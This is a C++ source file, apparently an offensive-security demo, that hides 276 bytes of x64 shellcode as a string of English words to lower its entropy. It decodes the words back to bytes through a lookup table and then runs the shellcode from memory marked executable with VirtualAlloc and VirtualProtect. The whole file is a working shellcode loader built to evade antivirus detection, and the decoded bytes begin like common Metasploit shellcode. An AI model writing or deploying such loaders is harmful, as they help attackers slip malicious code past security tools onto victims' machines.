/*
* Title: Entropy Reduction with English Words
* Resources:
*	- https://sekuro.io/blog/obfuscating-shellcode-entropy/
*/
#include <Windows.h>
#include <vector>
#include <string>
#include <iostream>

#define WORD_LENGTH 5

int GetIndex(char* targetWord, const char* words[], DWORD dwNumberOfWords) {
    int idx = 0;
    for (int i = 0; i < dwNumberOfWords; i++) {
        if (strcmp(targetWord, words[i]) == 0) {
            return idx;
        }
        idx++;
    }

    return -1;
}

int main() {
    const char* words[] = {
        "Easy", "Cast", "Link", "Jump", "Book", "Sale", "List", "Save", "View", "Step", "Hall", "Know",
        "Very", "Site", "Fish", "Name", "Back", "Sure", "Fast", "Firm", "Show", "Talk", "Girl", "Draw",
        "Need", "Over", "Wine", "Wall", "Wood", "Then", "Move", "Seek", "Nice", "Club", "Suit", "Star",
        "Band", "Face", "Damn", "Warn", "Hear", "Flat", "Hold", "Week", "Line", "Tour", "Tell", "Hurt",
        "Ever", "Goal", "Read", "Mary", "Slip", "Roll", "Much", "Wife", "Beat", "Cash", "Form", "Lady",
        "Hour", "Page", "Fund", "Wide", "Wake", "Keep", "Lead", "Grow", "Lend", "Hate", "Rain", "Wear",
        "Loss", "Pass", "Rise", "Last", "Must", "Miss", "News", "Join", "Tree", "Live", "City", "Push",
        "Late", "Army", "Okay", "Else", "Give", "Like", "Case", "Shop", "File", "Year", "Ball", "Farm",
        "Head", "Road", "Task", "Just", "Sing", "Rate", "Pray", "Earn", "Wash", "Hide", "When", "Call",
        "Sell", "That", "Skin", "Half", "Open", "Lack", "Rock", "Meet", "Send", "Fear", "Want", "Type",
        "Team", "Here", "Once", "Ride", "Idly", "Real", "Card", "Full", "Note", "Have", "Side", "Gold",
        "Fact", "Deep", "Fill", "Land", "Path", "Soon", "Time", "Afar", "Rule", "Gain", "Pain", "Text",
        "Body", "Wish", "Edge", "Dare", "Word", "Good", "Work", "Walk", "Ably", "Hand", "Hang", "Jack",
        "Door", "Film", "Sign", "Past", "Shut", "Bank", "User", "Duty", "Turn", "Idea", "Kill", "Lose",
        "Foot", "Role", "Come", "Paul", "Vote", "Seat", "Test", "Deal", "Town", "Burn", "King", "Duly",
        "Post", "Fail", "Cope", "Down", "Room", "Drop", "Look", "Home", "Lord", "Stop", "Park", "John",
        "East", "Bill", "Hope", "Sort", "Pull", "Stay", "Mind", "Fire", "Near", "Date", "Loud", "Cook",
        "High", "Life", "Mark", "Seem", "Will", "Make", "Deny", "Pick", "Shed", "Away", "Take", "Find",
        "Only", "Risk", "Slow", "Ring", "Thus", "Dead", "Hair", "Part", "Help", "Term", "Unit", "Cost",
        "Even", "Fair", "Love", "Solo", "Long", "Size", "Play", "Vary", "Game", "Rely", "Rest", "Wait",
        "Base", "Bear", "Pair", "Lift", "Care", "Hard", "Wind", "Kind", "Baby", "Fall", "Area", "Food",
        "Plan", "Feel", "This", "Tend"
    };

    unsigned char encodedShellcode[] =
        "\x50\x6c\x61\x6e\x00\x4c\x6f\x73\x73\x00\x47\x6f"
        "\x6c\x64\x00\x45\x76\x65\x6e\x00\x42\x61\x73\x65"
        "\x00\x4c\x6f\x6e\x67\x00\x45\x61\x73\x74\x00\x45"
        "\x61\x73\x79\x00\x45\x61\x73\x79\x00\x45\x61\x73"
        "\x79\x00\x4b\x65\x65\x70\x00\x4c\x69\x76\x65\x00"
        "\x4b\x65\x65\x70\x00\x54\x72\x65\x65\x00\x43\x69"
        "\x74\x79\x00\x4c\x69\x76\x65\x00\x4f\x6b\x61\x79"
        "\x00\x4c\x6f\x73\x73\x00\x47\x6f\x61\x6c\x00\x44"
        "\x65\x6e\x79\x00\x52\x61\x74\x65\x00\x4c\x6f\x73"
        "\x73\x00\x41\x66\x61\x72\x00\x43\x69\x74\x79\x00"
        "\x48\x65\x61\x64\x00\x4c\x6f\x73\x73\x00\x41\x66"
        "\x61\x72\x00\x43\x69\x74\x79\x00\x4e\x65\x65\x64"
        "\x00\x4c\x6f\x73\x73\x00\x41\x66\x61\x72\x00\x43"
        "\x69\x74\x79\x00\x4e\x69\x63\x65\x00\x4c\x6f\x73"
        "\x73\x00\x41\x66\x61\x72\x00\x52\x6f\x63\x6b\x00"
        "\x54\x72\x65\x65\x00\x4c\x6f\x73\x73\x00\x4e\x61"
        "\x6d\x65\x00\x44\x6f\x77\x6e\x00\x52\x69\x73\x65"
        "\x00\x52\x69\x73\x65\x00\x4d\x69\x73\x73\x00\x47"
        "\x6f\x61\x6c\x00\x44\x61\x74\x65\x00\x4c\x6f\x73"
        "\x73\x00\x47\x6f\x61\x6c\x00\x45\x61\x73\x74\x00"
        "\x56\x6f\x74\x65\x00\x48\x6f\x75\x72\x00\x52\x6f"
        "\x61\x64\x00\x49\x64\x6c\x79\x00\x4c\x69\x6e\x6b"
        "\x00\x4c\x69\x6e\x65\x00\x4e\x69\x63\x65\x00\x4b"
        "\x65\x65\x70\x00\x42\x69\x6c\x6c\x00\x44\x61\x74"
        "\x65\x00\x53\x69\x74\x65\x00\x4b\x65\x65\x70\x00"
        "\x43\x61\x73\x74\x00\x42\x69\x6c\x6c\x00\x55\x6e"
        "\x69\x74\x00\x52\x65\x6c\x79\x00\x43\x69\x74\x79"
        "\x00\x4b\x65\x65\x70\x00\x4c\x69\x76\x65\x00\x4c"
        "\x6f\x73\x73\x00\x41\x66\x61\x72\x00\x43\x69\x74"
        "\x79\x00\x4e\x69\x63\x65\x00\x41\x66\x61\x72\x00"
        "\x4c\x65\x61\x64\x00\x48\x6f\x75\x72\x00\x4c\x6f"
        "\x73\x73\x00\x43\x61\x73\x74\x00\x57\x69\x6c\x6c"
        "\x00\x41\x66\x61\x72\x00\x4e\x6f\x74\x65\x00\x50"
        "\x61\x74\x68\x00\x45\x61\x73\x79\x00\x45\x61\x73"
        "\x79\x00\x45\x61\x73\x79\x00\x4c\x6f\x73\x73\x00"
        "\x44\x65\x65\x70\x00\x45\x61\x73\x74\x00\x53\x65"
        "\x6e\x64\x00\x45\x61\x72\x6e\x00\x4c\x6f\x73\x73"
        "\x00\x43\x61\x73\x74\x00\x57\x69\x6c\x6c\x00\x54"
        "\x72\x65\x65\x00\x41\x66\x61\x72\x00\x4c\x6f\x73"
        "\x73\x00\x4e\x65\x65\x64\x00\x4c\x65\x6e\x64\x00"
        "\x41\x66\x61\x72\x00\x57\x61\x6b\x65\x00\x4e\x69"
        "\x63\x65\x00\x50\x61\x73\x73\x00\x43\x61\x73\x74"
        "\x00\x57\x69\x6c\x6c\x00\x43\x6f\x73\x74\x00\x4f"
        "\x6b\x61\x79\x00\x4c\x6f\x73\x73\x00\x54\x65\x6e"
        "\x64\x00\x44\x61\x74\x65\x00\x4b\x65\x65\x70\x00"
        "\x41\x66\x61\x72\x00\x53\x6c\x69\x70\x00\x50\x61"
        "\x74\x68\x00\x4c\x6f\x73\x73\x00\x43\x61\x73\x74"
        "\x00\x54\x61\x6b\x65\x00\x4d\x69\x73\x73\x00\x47"
        "\x6f\x61\x6c\x00\x44\x61\x74\x65\x00\x4c\x6f\x73"
        "\x73\x00\x47\x6f\x61\x6c\x00\x45\x61\x73\x74\x00"
        "\x56\x6f\x74\x65\x00\x4b\x65\x65\x70\x00\x42\x69"
        "\x6c\x6c\x00\x44\x61\x74\x65\x00\x53\x69\x74\x65"
        "\x00\x4b\x65\x65\x70\x00\x43\x61\x73\x74\x00\x42"
        "\x69\x6c\x6c\x00\x42\x65\x61\x74\x00\x48\x65\x6c"
        "\x70\x00\x46\x65\x61\x72\x00\x42\x65\x61\x72\x00"
        "\x4d\x75\x73\x74\x00\x4a\x75\x6d\x70\x00\x4d\x75"
        "\x73\x74\x00\x42\x61\x6e\x64\x00\x56\x69\x65\x77"
        "\x00\x48\x61\x74\x65\x00\x43\x61\x73\x68\x00\x4d"
        "\x61\x6b\x65\x00\x46\x65\x61\x72\x00\x4f\x6e\x6c"
        "\x79\x00\x47\x69\x76\x65\x00\x4c\x65\x6e\x64\x00"
        "\x41\x66\x61\x72\x00\x57\x61\x6b\x65\x00\x42\x61"
        "\x6e\x64\x00\x50\x61\x73\x73\x00\x43\x61\x73\x74"
        "\x00\x57\x69\x6c\x6c\x00\x50\x72\x61\x79\x00\x4b"
        "\x65\x65\x70\x00\x41\x66\x61\x72\x00\x56\x65\x72"
        "\x79\x00\x4c\x6f\x73\x73\x00\x4c\x65\x6e\x64\x00"
        "\x41\x66\x61\x72\x00\x57\x61\x6b\x65\x00\x57\x6f"
        "\x6f\x64\x00\x50\x61\x73\x73\x00\x43\x61\x73\x74"
        "\x00\x57\x69\x6c\x6c\x00\x4b\x65\x65\x70\x00\x41"
        "\x66\x61\x72\x00\x42\x6f\x6f\x6b\x00\x50\x61\x74"
        "\x68\x00\x4c\x6f\x73\x73\x00\x43\x61\x73\x74\x00"
        "\x57\x69\x6c\x6c\x00\x4b\x65\x65\x70\x00\x47\x69"
        "\x76\x65\x00\x4b\x65\x65\x70\x00\x47\x69\x76\x65"
        "\x00\x42\x61\x6c\x6c\x00\x4c\x69\x6b\x65\x00\x43"
        "\x61\x73\x65\x00\x4b\x65\x65\x70\x00\x47\x69\x76"
        "\x65\x00\x4b\x65\x65\x70\x00\x4c\x69\x6b\x65\x00"
        "\x4b\x65\x65\x70\x00\x43\x61\x73\x65\x00\x4c\x6f"
        "\x73\x73\x00\x47\x6f\x6c\x64\x00\x47\x61\x6d\x65"
        "\x00\x4e\x69\x63\x65\x00\x4b\x65\x65\x70\x00\x43"
        "\x69\x74\x79\x00\x54\x65\x6e\x64\x00\x48\x65\x6c"
        "\x70\x00\x47\x69\x76\x65\x00\x4b\x65\x65\x70\x00"
        "\x4c\x69\x6b\x65\x00\x43\x61\x73\x65\x00\x4c\x6f"
        "\x73\x73\x00\x41\x66\x61\x72\x00\x46\x61\x73\x74"
        "\x00\x53\x69\x7a\x65\x00\x45\x6c\x73\x65\x00\x54"
        "\x65\x6e\x64\x00\x54\x65\x6e\x64\x00\x54\x65\x6e"
        "\x64\x00\x59\x65\x61\x72\x00\x4c\x6f\x73\x73\x00"
        "\x4c\x6f\x6f\x6b\x00\x43\x61\x73\x74\x00\x45\x61"
        "\x73\x79\x00\x45\x61\x73\x79\x00\x45\x61\x73\x79"
        "\x00\x45\x61\x73\x79\x00\x45\x61\x73\x79\x00\x45"
        "\x61\x73\x79\x00\x45\x61\x73\x79\x00\x4c\x6f\x73"
        "\x73\x00\x47\x61\x69\x6e\x00\x47\x61\x69\x6e\x00"
        "\x43\x61\x73\x74\x00\x43\x61\x73\x74\x00\x45\x61"
        "\x73\x79\x00\x45\x61\x73\x79\x00\x4b\x65\x65\x70"
        "\x00\x4c\x6f\x6f\x6b\x00\x47\x6f\x61\x6c\x00\x41"
        "\x66\x61\x72\x00\x48\x61\x6c\x66\x00\x4c\x61\x6e"
        "\x64\x00\x54\x65\x6e\x64\x00\x41\x77\x61\x79\x00"
        "\x48\x6f\x6d\x65\x00\x42\x61\x73\x65\x00\x46\x61"
        "\x69\x6c\x00\x55\x73\x65\x72\x00\x4f\x6b\x61\x79"
        "\x00\x4b\x65\x65\x70\x00\x4c\x6f\x6f\x6b\x00\x4b"
        "\x69\x6c\x6c\x00\x47\x6f\x6f\x64\x00\x53\x74\x6f"
        "\x70\x00\x46\x69\x6c\x6d\x00\x54\x65\x6e\x64\x00"
        "\x41\x77\x61\x79\x00\x4c\x6f\x73\x73\x00\x47\x6f"
        "\x6c\x64\x00\x50\x75\x6c\x6c\x00\x48\x65\x61\x72"
        "\x00\x48\x6f\x75\x72\x00\x4c\x69\x73\x74\x00\x49"
        "\x64\x6c\x79\x00\x48\x61\x6c\x6c\x00\x4e\x6f\x74"
        "\x65\x00\x46\x6f\x6f\x64\x00\x48\x65\x6c\x70\x00"
        "\x46\x65\x61\x72\x00\x53\x61\x6c\x65\x00\x48\x6f"
        "\x6d\x65\x00\x57\x65\x61\x72\x00\x46\x69\x72\x6d"
        "\x00\x52\x6f\x63\x6b\x00\x48\x61\x6c\x66\x00\x57"
        "\x68\x65\x6e\x00\x45\x61\x73\x79\x00\x4c\x69\x6b"
        "\x65\x00\x4b\x65\x65\x70\x00\x53\x6f\x6f\x6e\x00"
        "\x53\x6c\x6f\x77\x00\x54\x65\x6e\x64\x00\x41\x77"
        "\x61\x79\x00\x4a\x75\x73\x74\x00\x52\x6f\x61\x64"
        "\x00\x53\x65\x6c\x6c\x00\x4a\x75\x73\x74\x00\x54"
        "\x65\x6c\x6c\x00\x52\x61\x74\x65\x00\x54\x65\x61"
        "\x6d\x00\x52\x61\x74\x65\x00\x45\x61\x73\x79\x00";

    DWORD dwShellcodeSize = 276;

    // Decode with words
    unsigned char* shellcode = (unsigned char*)malloc(dwShellcodeSize);
    DWORD dwNumberOfWords = sizeof(words) / sizeof(words[0]);
    int wordIdx = 0;
    for (int i = 0; i < dwShellcodeSize; i++) {
        //*(decryptedShellcode + i) = GetIndex((char*)(encodedShellcode + (i * WORD_LENGTH)), words, dwNumberOfWords);
        wordIdx = GetIndex((char*)(encodedShellcode + (i * WORD_LENGTH)), words, dwNumberOfWords);
        if (wordIdx == -1) {
            std::cerr << "Error: Failed to find word from encoded shellcode." << std::endl;
            return 1;
        }
        *(shellcode + i) = wordIdx;
    }

    // -----------------------------------------------------------------------------
    // The following code is the Shellcode Injection example.
    // -----------------------------------------------------------------------------

    LPVOID lpExec = VirtualAlloc(nullptr, dwShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpExec) return FALSE;

    memcpy(lpExec, shellcode, dwShellcodeSize);

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(lpExec, dwShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(lpExec, 0, MEM_RELEASE);
        return FALSE;
    }

    ((void(*)())lpExec)();

	return 0;
}